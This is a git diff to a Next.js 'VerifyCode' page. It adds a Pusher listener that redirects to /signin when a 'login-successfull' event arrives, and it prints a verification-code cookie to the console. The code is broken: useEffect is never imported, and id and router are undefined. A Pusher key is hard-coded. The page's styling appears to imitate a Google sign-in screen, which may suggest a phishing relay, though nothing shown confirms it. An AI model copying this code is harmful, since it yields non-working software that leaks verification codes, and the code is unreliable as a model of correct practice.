@@ -1,10 +1,37 @@
-import React from "react";
+"use client";
+import React, { useState } from "react";
 import Image from "next/image";
 import Cookies from "js-cookie";
-
+import Pusher from "pusher-js";
 export default function VerifyCode() {
- 
+  const[successId, setSuccessId] = useState('');
+  const pusher = new Pusher("e4766909b306ad7ddd58", {
+    // APP_KEY
+    cluster: "ap2",
+    encrypted: true,
+  });
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
+
+    channel.bind('login-successfull', (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log('Path data updated:', data);
+      console.log(data.id)
+      setSuccessId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind('login-successfull');
+      channel.unsubscribe(id);
+    };
+  }, [id]);
+
+  if (successId) {
+    // Perform the revalidation or data fetching logic here
+  return router.push(`/signin`)
+}
 const code=Cookies.get("code")
+console.log(code)
   return (
     <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
       <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[550px]">
